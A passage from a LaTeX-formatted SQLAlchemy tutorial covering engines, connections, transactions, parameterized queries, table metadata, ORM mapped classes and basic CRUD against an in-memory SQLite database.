\NormalTok{employee }\OperatorTok{=}\NormalTok{ session.query(Employee).filter\_by(name}\OperatorTok{=}\StringTok{\textquotesingle{}Jane Doe\textquotesingle{}}\NormalTok{).first()}
\NormalTok{employee.age }\OperatorTok{=} \DecValTok{29}
\NormalTok{session.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Deleting Data}\label{deleting-data-1}

You can delete data from the database by deleting the model instance
from the session.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Delete data}
\NormalTok{employee }\OperatorTok{=}\NormalTok{ session.query(Employee).filter\_by(name}\OperatorTok{=}\StringTok{\textquotesingle{}Jane Doe\textquotesingle{}}\NormalTok{).first()}
\NormalTok{session.delete(employee)}
\NormalTok{session.commit()}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-15}

Interacting with databases is a fundamental skill for developing
data-driven applications. Python provides powerful libraries like
\texttt{sqlite3} for simple database interactions and
\texttt{SQLAlchemy} for advanced ORM capabilities. By mastering these
tools, you can efficiently manage database connections, perform CRUD
operations, and build robust applications.

\section{Establishing Connectivity with
SQLAlchemy}\label{establishing-connectivity-with-sqlalchemy}

\subsection{Introduction to SQLAlchemy
Engine}\label{introduction-to-sqlalchemy-engine}

Every SQLAlchemy application that connects to a database needs to use an
Engine. The Engine acts as a central source of connections to a
particular database, providing both a factory and a holding space called
a connection pool for these database connections. This tutorial will
guide you through the process of establishing connectivity using the
Engine, applicable to both ORM and Core users.

\subsection{Creating the Engine}\label{creating-the-engine}

The start of any SQLAlchemy application is an object called the Engine.
The Engine is typically a global object created just once for a
particular database server and is configured using a URL string that
describes how it should connect to the database host or backend.

For this tutorial, we will use an in-memory-only SQLite database. This
is an easy way to test things without needing a pre-existing database
setup. The Engine is created using the \texttt{create\_engine()}
function:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ create\_engine}

\CommentTok{\# Create an in{-}memory SQLite database}
\NormalTok{engine }\OperatorTok{=}\NormalTok{ create\_engine(}\StringTok{"sqlite+pysqlite:///:memory:"}\NormalTok{, echo}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Understanding the URL
String}\label{understanding-the-url-string}

The main argument to \texttt{create\_engine} is a string URL, in this
case, passed as the string \texttt{"sqlite+pysqlite:///:memory:"}. This
string indicates three important facts to the Engine:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Database Type}: The type of database we are communicating
  with, specified by \texttt{sqlite} in the URL, links SQLAlchemy to an
  object known as the dialect.
\item
  \textbf{DBAPI}: The Python DBAPI used to interact with the database.
  Here, \texttt{pysqlite} indicates that we are using the
  \texttt{sqlite3} standard library interface for SQLite. If omitted,
  SQLAlchemy will use a default DBAPI for the selected database.
\item
  \textbf{Database Location}: The phrase \texttt{/:memory:} indicates
  that we are using an in-memory-only database. This is perfect for
  experimenting as it does not require any server or create any new
  files.
\end{enumerate}

\subsection{Lazy Connecting}\label{lazy-connecting}

The Engine, when first returned by \texttt{create\_engine()}, has not
actually tried to connect to the database yet; that happens only the
first time it is asked to perform a task against the database. This
design pattern is known as lazy initialization.

\subsection{Enabling SQL Logging}\label{enabling-sql-logging}

We have also specified a parameter \texttt{echo=True} in
\texttt{create\_engine}, which instructs the Engine to log all the SQL
it emits to a Python logger that writes to standard output. This flag is
a shorthand way of setting up Python logging and is useful for
experimentation in scripts. Many of the SQL examples will include this
SQL logging output beneath a \texttt{{[}SQL{]}} link that, when clicked,
will reveal the full SQL interaction.

\subsection{Example: Connecting to an In-Memory SQLite
Database}\label{example-connecting-to-an-in-memory-sqlite-database}

Here's a complete example of how to create an Engine and connect to an
in-memory SQLite database:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ create\_engine}

\CommentTok{\# Create an in{-}memory SQLite database}
\NormalTok{engine }\OperatorTok{=}\NormalTok{ create\_engine(}\StringTok{"sqlite+pysqlite:///:memory:"}\NormalTok{, echo}\OperatorTok{=}\VariableTok{True}\NormalTok{)}

\CommentTok{\# Perform a simple database operation}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ connection:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ connection.execute(}\StringTok{"SELECT \textquotesingle{}Hello, World!\textquotesingle{}"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(result.fetchall())}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-16}

In this tutorial, we have covered the basics of establishing
connectivity with SQLAlchemy using the Engine. We created an Engine for
an in-memory SQLite database, understood the components of the
connection URL, and enabled SQL logging for better visibility into the
SQL operations performed by SQLAlchemy. This foundational knowledge is
essential for both ORM and Core users as it sets the stage for more
advanced database interactions using SQLAlchemy.

\section{Working with Transactions and the DBAPI with
SQLAlchemy}\label{working-with-transactions-and-the-dbapi-with-sqlalchemy}

\subsection{Introduction}\label{introduction-1}

With the Engine object ready, we can dive into the basic operation of an
Engine and its primary interactive endpoints: the Connection and the
Result. For ORM users, the Session object manages the Engine and
emphasizes a transactional SQL execution pattern similar to the
Connection. This tutorial will cover how to establish a connection,
execute transactions, and work with results using both Core and ORM
contexts in SQLAlchemy.

\subsection{Establishing a Connection}\label{establishing-a-connection}

The primary purpose of the Engine object is to provide a unit of
connectivity to the database called the Connection. When working with
SQLAlchemy Core, the Connection object is the primary interface for
interacting with the database.

\subsubsection{Creating a Connection}\label{creating-a-connection}

A Connection object can be created using the \texttt{engine.connect()}
method. It's best to use a context manager to ensure the connection is
properly managed and closed.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ create\_engine, text}

\CommentTok{\# Create an in{-}memory SQLite database}
\NormalTok{engine }\OperatorTok{=}\NormalTok{ create\_engine(}\StringTok{"sqlite+pysqlite:///:memory:"}\NormalTok{, echo}\OperatorTok{=}\VariableTok{True}\NormalTok{)}

\CommentTok{\# Establishing a connection using a context manager}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(text(}\StringTok{"SELECT \textquotesingle{}hello world\textquotesingle{}"}\NormalTok{))}
    \BuiltInTok{print}\NormalTok{(result.}\BuiltInTok{all}\NormalTok{())}
\end{Highlighting}
\end{Shaded}

\subsection{Transactions}\label{transactions}

Transactions are crucial for maintaining data integrity. By default, a
transaction is always in progress, and a ROLLBACK is issued when the
connection scope is released.

\subsubsection{Committing Changes}\label{committing-changes}

To commit changes, use the \texttt{Connection.commit()} method within
the context block.

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    conn.execute(text(}\StringTok{"CREATE TABLE some\_table (x int, y int)"}\NormalTok{))}
\NormalTok{    conn.execute(}
\NormalTok{        text(}\StringTok{"INSERT INTO some\_table (x, y) VALUES (:x, :y)"}\NormalTok{),}
\NormalTok{        [\{}\StringTok{"x"}\NormalTok{: }\DecValTok{1}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{1}\NormalTok{\}, \{}\StringTok{"x"}\NormalTok{: }\DecValTok{2}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{4}\NormalTok{\}]}
\NormalTok{    )}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Begin Once Style}\label{begin-once-style}

Alternatively, use \texttt{engine.begin()} to manage the connection and
transaction scope automatically.

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.begin() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    conn.execute(}
\NormalTok{        text(}\StringTok{"INSERT INTO some\_table (x, y) VALUES (:x, :y)"}\NormalTok{),}
\NormalTok{        [\{}\StringTok{"x"}\NormalTok{: }\DecValTok{6}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{8}\NormalTok{\}, \{}\StringTok{"x"}\NormalTok{: }\DecValTok{9}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{10}\NormalTok{\}]}
\NormalTok{    )}
\end{Highlighting}
\end{Shaded}

\subsection{Statement Execution}\label{statement-execution}

SQL statements can be executed using the \texttt{Connection.execute()}
method along with the \texttt{text()} construct.

\subsubsection{Fetching Rows}\label{fetching-rows}

Results are fetched using the Result object, which supports various
methods for accessing data.

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(text(}\StringTok{"SELECT x, y FROM some\_table"}\NormalTok{))}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"x: }\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{x}\SpecialCharTok{\}}\SpecialStringTok{  y: }\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{y}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Parameterized Queries}\label{parameterized-queries}

Parameters can be passed to SQL statements using dictionaries, ensuring
proper value sanitization and preventing SQL injection.

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(text(}\StringTok{"SELECT x, y FROM some\_table WHERE y \textgreater{} :y"}\NormalTok{), \{}\StringTok{"y"}\NormalTok{: }\DecValTok{2}\NormalTok{\})}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"x: }\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{x}\SpecialCharTok{\}}\SpecialStringTok{  y: }\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{y}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Sending Multiple
Parameters}\label{sending-multiple-parameters}

Multiple parameter sets can be sent using a list of dictionaries,
enabling efficient execution of multiple SQL statements.

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    conn.execute(}
\NormalTok{        text(}\StringTok{"INSERT INTO some\_table (x, y) VALUES (:x, :y)"}\NormalTok{),}
\NormalTok{        [\{}\StringTok{"x"}\NormalTok{: }\DecValTok{11}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{12}\NormalTok{\}, \{}\StringTok{"x"}\NormalTok{: }\DecValTok{13}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{14}\NormalTok{\}]}
\NormalTok{    )}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

\subsection{Using ORM Session}\label{using-orm-session}

The Session object in SQLAlchemy ORM provides a higher-level interface
for managing database interactions.

\subsubsection{Executing with ORM
Session}\label{executing-with-orm-session}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ Session}

\NormalTok{stmt }\OperatorTok{=}\NormalTok{ text(}\StringTok{"SELECT x, y FROM some\_table WHERE y \textgreater{} :y ORDER BY x, y"}\NormalTok{)}
\ControlFlowTok{with}\NormalTok{ Session(engine) }\ImportTok{as}\NormalTok{ session:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ session.execute(stmt, \{}\StringTok{"y"}\NormalTok{: }\DecValTok{6}\NormalTok{\})}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"x: }\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{x}\SpecialCharTok{\}}\SpecialStringTok{  y: }\SpecialCharTok{\{}\NormalTok{row}\SpecialCharTok{.}\NormalTok{y}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Committing Changes with ORM
Session}\label{committing-changes-with-orm-session}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ Session(engine) }\ImportTok{as}\NormalTok{ session:}
\NormalTok{    session.execute(}
\NormalTok{        text(}\StringTok{"UPDATE some\_table SET y=:y WHERE x=:x"}\NormalTok{),}
\NormalTok{        [\{}\StringTok{"x"}\NormalTok{: }\DecValTok{9}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{11}\NormalTok{\}, \{}\StringTok{"x"}\NormalTok{: }\DecValTok{13}\NormalTok{, }\StringTok{"y"}\NormalTok{: }\DecValTok{15}\NormalTok{\}]}
\NormalTok{    )}
\NormalTok{    session.commit()}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-17}

This tutorial covered the basics of working with transactions and the
DBAPI using SQLAlchemy. We demonstrated how to establish a connection,
execute transactions, and work with results using both Core and ORM
contexts. Understanding these foundational concepts will enable you to
effectively manage database interactions in your SQLAlchemy
applications.

\section{Working with Database Metadata with
SQLAlchemy}\label{working-with-database-metadata-with-sqlalchemy}

\subsection{Introduction}\label{introduction-2}

With the basics of engines and SQL execution covered, we can now delve
into SQLAlchemy's core strength: working with database metadata.
Database metadata allows for fluent, composable construction of SQL
queries using Python objects that represent database concepts like
tables and columns. This tutorial will illustrate how to work with
database metadata in both Core and ORM contexts.

\subsection{Setting Up Metadata with Table
Objects}\label{setting-up-metadata-with-table-objects}

In SQLAlchemy, the primary object representing a table is the
\texttt{Table} object. To start using SQLAlchemy's Expression Language,
we need to construct \texttt{Table} objects that represent our database
tables. This is done using the \texttt{MetaData} object, which acts as a
collection for \texttt{Table} objects.

\subsubsection{Creating a MetaData
Object}\label{creating-a-metadata-object}

First, create a \texttt{MetaData} object:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ MetaData}

\NormalTok{metadata\_obj }\OperatorTok{=}\NormalTok{ MetaData()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Defining Table Objects}\label{defining-table-objects}

We can now define \texttt{Table} objects. For this tutorial, we will use
a \texttt{user\_account} table and an \texttt{address} table.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ Table, Column, Integer, String, ForeignKey}

\CommentTok{\# Define the user\_account table}
\NormalTok{user\_table }\OperatorTok{=}\NormalTok{ Table(}
    \StringTok{"user\_account"}\NormalTok{,}
\NormalTok{    metadata\_obj,}
\NormalTok{    Column(}\StringTok{"id"}\NormalTok{, Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{),}
\NormalTok{    Column(}\StringTok{"name"}\NormalTok{, String(}\DecValTok{30}\NormalTok{)),}
\NormalTok{    Column(}\StringTok{"fullname"}\NormalTok{, String),}
\NormalTok{)}

\CommentTok{\# Define the address table with a foreign key to user\_account}
\NormalTok{address\_table }\OperatorTok{=}\NormalTok{ Table(}
    \StringTok{"address"}\NormalTok{,}
\NormalTok{    metadata\_obj,}
\NormalTok{    Column(}\StringTok{"id"}\NormalTok{, Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{),}
\NormalTok{    Column(}\StringTok{"user\_id"}\NormalTok{, ForeignKey(}\StringTok{"user\_account.id"}\NormalTok{), nullable}\OperatorTok{=}\VariableTok{False}\NormalTok{),}
\NormalTok{    Column(}\StringTok{"email\_address"}\NormalTok{, String, nullable}\OperatorTok{=}\VariableTok{False}\NormalTok{),}
\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Emitting DDL to the
Database}\label{emitting-ddl-to-the-database}

With our \texttt{Table} objects defined, we can create the actual tables
in the database using the \texttt{MetaData.create\_all()} method.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ create\_engine}

\CommentTok{\# Create an in{-}memory SQLite database}
\NormalTok{engine }\OperatorTok{=}\NormalTok{ create\_engine(}\StringTok{"sqlite+pysqlite:///:memory:"}\NormalTok{, echo}\OperatorTok{=}\VariableTok{True}\NormalTok{)}

\CommentTok{\# Create the tables in the database}
\NormalTok{metadata\_obj.create\_all(engine)}
\end{Highlighting}
\end{Shaded}

\subsection{Working with Constraints}\label{working-with-constraints}

Constraints such as primary keys and foreign keys can be defined using
the \texttt{Column} object parameters and \texttt{ForeignKey} objects.

\subsubsection{Primary Key Constraint}\label{primary-key-constraint}

The primary key is defined using the \texttt{primary\_key} parameter in
the \texttt{Column} definition.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Column(}\StringTok{"id"}\NormalTok{, Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Foreign Key Constraint}\label{foreign-key-constraint}

A foreign key constraint is defined using the \texttt{ForeignKey}
object.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Column(}\StringTok{"user\_id"}\NormalTok{, ForeignKey(}\StringTok{"user\_account.id"}\NormalTok{), nullable}\OperatorTok{=}\VariableTok{False}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Declaring ORM Mapped
Classes}\label{declaring-orm-mapped-classes}

Using the ORM, we can define our tables and mapped classes using the
\texttt{DeclarativeBase} class.

\subsubsection{Establishing a Declarative
Base}\label{establishing-a-declarative-base}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ DeclarativeBase}

\KeywordTok{class}\NormalTok{ Base(DeclarativeBase):}
    \ControlFlowTok{pass}
\end{Highlighting}
\end{Shaded}

\subsubsection{Defining Mapped Classes}\label{defining-mapped-classes}

We can now define our ORM mapped classes \texttt{User} and
\texttt{Address}.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ typing }\ImportTok{import}\NormalTok{ List, Optional}
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ Mapped, mapped\_column, relationship}

\KeywordTok{class}\NormalTok{ User(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{"user\_account"}

    \BuiltInTok{id}\NormalTok{: Mapped[}\BuiltInTok{int}\NormalTok{] }\OperatorTok{=}\NormalTok{ mapped\_column(primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    name: Mapped[}\BuiltInTok{str}\NormalTok{] }\OperatorTok{=}\NormalTok{ mapped\_column(String(}\DecValTok{30}\NormalTok{))}
\NormalTok{    fullname: Mapped[Optional[}\BuiltInTok{str}\NormalTok{]]}

\NormalTok{    addresses: Mapped[List[}\StringTok{"Address"}\NormalTok{]] }\OperatorTok{=}\NormalTok{ relationship(back\_populates}\OperatorTok{=}\StringTok{"user"}\NormalTok{)}

    \KeywordTok{def} \FunctionTok{\_\_repr\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{) }\OperatorTok{{-}\textgreater{}} \BuiltInTok{str}\NormalTok{:}
        \ControlFlowTok{return} \SpecialStringTok{f"User(id=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\BuiltInTok{id}\SpecialCharTok{!r\}}\SpecialStringTok{, name=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{!r\}}\SpecialStringTok{, fullname=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{fullname}\SpecialCharTok{!r\}}\SpecialStringTok{)"}

\KeywordTok{class}\NormalTok{ Address(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{"address"}

    \BuiltInTok{id}\NormalTok{: Mapped[}\BuiltInTok{int}\NormalTok{] }\OperatorTok{=}\NormalTok{ mapped\_column(primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    email\_address: Mapped[}\BuiltInTok{str}\NormalTok{]}
\NormalTok{    user\_id }\OperatorTok{=}\NormalTok{ mapped\_column(ForeignKey(}\StringTok{"user\_account.id"}\NormalTok{))}

\NormalTok{    user: Mapped[User] }\OperatorTok{=}\NormalTok{ relationship(back\_populates}\OperatorTok{=}\StringTok{"addresses"}\NormalTok{)}

    \KeywordTok{def} \FunctionTok{\_\_repr\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{) }\OperatorTok{{-}\textgreater{}} \BuiltInTok{str}\NormalTok{:}
        \ControlFlowTok{return} \SpecialStringTok{f"Address(id=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\BuiltInTok{id}\SpecialCharTok{!r\}}\SpecialStringTok{, email\_address=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{email\_address}\SpecialCharTok{!r\}}\SpecialStringTok{)"}
\end{Highlighting}
\end{Shaded}

\subsection{Emitting DDL from ORM Mapped
Classes}\label{emitting-ddl-from-orm-mapped-classes}

To create tables from our ORM mapped classes, use the
\texttt{Base.metadata.create\_all()} method.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Create the tables in the database}
\NormalTok{Base.metadata.create\_all(engine)}
\end{Highlighting}
\end{Shaded}

\subsection{Table Reflection}\label{table-reflection}

Table reflection generates \texttt{Table} objects from an existing
database schema.

\subsubsection{Reflecting Tables}\label{reflecting-tables}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Reflect the some\_table from the existing database}
\NormalTok{some\_table }\OperatorTok{=}\NormalTok{ Table(}\StringTok{"some\_table"}\NormalTok{, metadata\_obj, autoload\_with}\OperatorTok{=}\NormalTok{engine)}
\BuiltInTok{print}\NormalTok{(some\_table)}
\end{Highlighting}
\end{Shaded}

\subsection{Next Steps}\label{next-steps}

With our database schema defined and tables created, we can now proceed
to create, manipulate, and select data using both Core and ORM
constructs in SQLAlchemy.

\subsection{Conclusion}\label{conclusion-18}

This tutorial covered the basics of working with database metadata in
SQLAlchemy, including defining tables, emitting DDL to the database, and
using ORM mapped classes. Understanding these concepts is fundamental
for effective database management and query construction in SQLAlchemy.

\section{Working with Data with
SQLAlchemy}\label{working-with-data-with-sqlalchemy}

In the previous tutorials, we covered interacting with the Python DBAPI
and its transactional state, and representing database tables, columns,
and constraints using SQLAlchemy's MetaData and related objects. In this
tutorial, we'll combine these concepts to create, select, and manipulate
data within a relational database. Interactions with the database are
always within the context of a transaction, even if autocommit is used
behind the scenes.

\subsection{Components of this
Tutorial}\label{components-of-this-tutorial}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Using INSERT Statements}: We'll introduce and demonstrate the
  Core Insert construct to get data into the database.
\item
  \textbf{Using SELECT Statements}: We'll describe the Select construct,
  which emits SELECT statements for both Core and ORM-centric
  applications.
\item
  \textbf{Using UPDATE and DELETE Statements}: We'll cover the use of
  the Update and Delete constructs from a Core perspective.
\end{enumerate}

\subsection{Using INSERT Statements}\label{using-insert-statements}

To insert data into the database, we use the Core Insert construct.

\subsubsection{Example: Inserting Data with
Core}\label{example-inserting-data-with-core}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ create\_engine, MetaData, Table, Column, Integer, String, insert}

\CommentTok{\# Create an in{-}memory SQLite database}
\NormalTok{engine }\OperatorTok{=}\NormalTok{ create\_engine(}\StringTok{"sqlite+pysqlite:///:memory:"}\NormalTok{, echo}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{metadata }\OperatorTok{=}\NormalTok{ MetaData()}

\CommentTok{\# Define a user\_account table}
\NormalTok{user\_table }\OperatorTok{=}\NormalTok{ Table(}
    \StringTok{"user\_account"}\NormalTok{, metadata,}
\NormalTok{    Column(}\StringTok{"id"}\NormalTok{, Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{),}
\NormalTok{    Column(}\StringTok{"name"}\NormalTok{, String(}\DecValTok{30}\NormalTok{)),}
\NormalTok{    Column(}\StringTok{"fullname"}\NormalTok{, String)}
\NormalTok{)}

\CommentTok{\# Create the table in the database}
\NormalTok{metadata.create\_all(engine)}

\CommentTok{\# Insert data into the user\_account table}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    stmt }\OperatorTok{=}\NormalTok{ insert(user\_table).values(name}\OperatorTok{=}\StringTok{"john"}\NormalTok{, fullname}\OperatorTok{=}\StringTok{"John Doe"}\NormalTok{)}
\NormalTok{    conn.execute(stmt)}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

\subsection{Using SELECT Statements}\label{using-select-statements}

The \texttt{Select} construct is the most commonly used object in
SQLAlchemy, allowing us to query data from the database.

\subsubsection{Example: Selecting Data with
Core}\label{example-selecting-data-with-core}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ select}

\CommentTok{\# Select data from the user\_account table}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    stmt }\OperatorTok{=}\NormalTok{ select(user\_table)}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(stmt)}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Example: Selecting Data with
ORM}\label{example-selecting-data-with-orm}

For ORM users, the process is similar but uses the Session object.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ Session}

\CommentTok{\# Define a user model}
\KeywordTok{class}\NormalTok{ User(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{"user\_account"}
    \BuiltInTok{id} \OperatorTok{=}\NormalTok{ Column(Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    name }\OperatorTok{=}\NormalTok{ Column(String(}\DecValTok{30}\NormalTok{))}
\NormalTok{    fullname }\OperatorTok{=}\NormalTok{ Column(String)}

\CommentTok{\# Create a session}
\ControlFlowTok{with}\NormalTok{ Session(engine) }\ImportTok{as}\NormalTok{ session:}
\NormalTok{    stmt }\OperatorTok{=}\NormalTok{ select(User)}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ session.execute(stmt)}
    \ControlFlowTok{for}\NormalTok{ user }\KeywordTok{in}\NormalTok{ result.scalars():}
        \BuiltInTok{print}\NormalTok{(user.name, user.fullname)}
\end{Highlighting}
\end{Shaded}

\subsection{Using UPDATE and DELETE
Statements}\label{using-update-and-delete-statements}

To update or delete data, we use the \texttt{Update} and \texttt{Delete}
constructs.

\subsubsection{Example: Updating Data with
Core}\label{example-updating-data-with-core}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ update}

\CommentTok{\# Update data in the user\_account table}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    stmt }\OperatorTok{=}\NormalTok{ update(user\_table).where(user\_table.c.name }\OperatorTok{==} \StringTok{"john"}\NormalTok{).values(fullname}\OperatorTok{=}\StringTok{"Jonathan Doe"}\NormalTok{)}
\NormalTok{    conn.execute(stmt)}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Example: Deleting Data with
Core}\label{example-deleting-data-with-core}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ delete}

\CommentTok{\# Delete data from the user\_account table}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    stmt }\OperatorTok{=}\NormalTok{ delete(user\_table).where(user\_table.c.name }\OperatorTok{==} \StringTok{"john"}\NormalTok{)}
\NormalTok{    conn.execute(stmt)}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

\subsection{Data Manipulation with
ORM}\label{data-manipulation-with-orm}

For ORM-specific data manipulation, we use the Session object.

\subsubsection{Example: Inserting Data with
ORM}\label{example-inserting-data-with-orm}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Insert data using ORM}
\ControlFlowTok{with}\NormalTok{ Session(engine) }\ImportTok{as}\NormalTok{ session:}
\NormalTok{    new\_user }\OperatorTok{=}\NormalTok{ User(name}\OperatorTok{=}\StringTok{"sandy"}\NormalTok{, fullname}\OperatorTok{=}\StringTok{"Sandy Cheeks"}\NormalTok{)}
\NormalTok{    session.add(new\_user)}
\NormalTok{    session.commit()}
\end{Highlighting}
\end{Shaded}

